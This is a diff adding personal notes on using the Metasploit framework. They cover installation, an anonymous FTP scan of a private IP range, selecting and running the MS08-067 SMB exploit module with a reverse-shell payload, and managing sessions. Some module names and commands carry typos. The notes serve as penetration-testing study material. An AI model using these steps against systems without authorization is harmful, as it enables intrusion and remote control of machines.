@@ -1,0 +1,94 @@
+=== metasploit ===
+
+== Installation ==
+
+Normally pre-installed with Kali. But if not:
+
+1) Download from rapid7's metasploit-ombibus github repo
+	https://github.com/rapid7/metasploit-framework
+
+2) ./msfinstall 
+3) msfdb init 
+
+== Usage == 
+
+'msf>' assumes you have to launch mfsconsole first
+
+Usage examples:
+
+Use anonymous ftp scanner that tries each IP in the range and tries to access anon FTP:
+
+		msf> user scanner/ftp/anonymous
+		msf> set RHOSTS 192.168.1.10-20
+		msf> exploit
+
+On the first run - do 'msfdb start' as root first.
+
+== Search for an interesting module == 
+
+	msf> search ms08-067
+
+== Info about the module == 
+	
+	msf> info exploit/windows/smb/msf08_067_netapi
+
+
+== Select / activate the module == 
+
+	msf> use exploit/windows/smb/msf08_067_netapi
+
+== Module options == 
+
+	msf exploit(...)> show options
+
+	msf exploit(...)> set RHOST 1.2.3.4
+
+== Show / Find a payload == 
+
+	msf exploit(...)> show payloads 
+
+== Set payload == 
+
+	msf exploit(...)> set payload windows/shell_reverse_tcp 
+
+	(often not necessary, as the default payload would work)
+
+== RUN == 
+
+	msf exploit(...)> exploit 
+
+
+== SET TARGET == 
+
+	msf..> show targets 
+	msf..> set target <targetnum> 
+
+== List sessions == 
+
+	msf...> sessions 
+
+ - attach to a particular: 
+
+ 	msf...> session -i <number> 
+
+ - send session to BG 
+
+ 	msf...> background 
+
+		or ctrl+Z 
+
+=== Staged vs Inline payloads === 
+
+Many payloads are available in two formats: 
+	* Staged - using two-stage loading for the actual payload code: 
+		- initial payload size smaller 
+	* inline - including everything in one blob/file 
+		- payload becomes bigger (much!), but it hosts all the dependencies 
+
+Naming convention: 
+	php/meterpreter_reverse_tcp <-- inline 
+	php/meterpreter/reverse_tcp - staged 
+
+
+
+
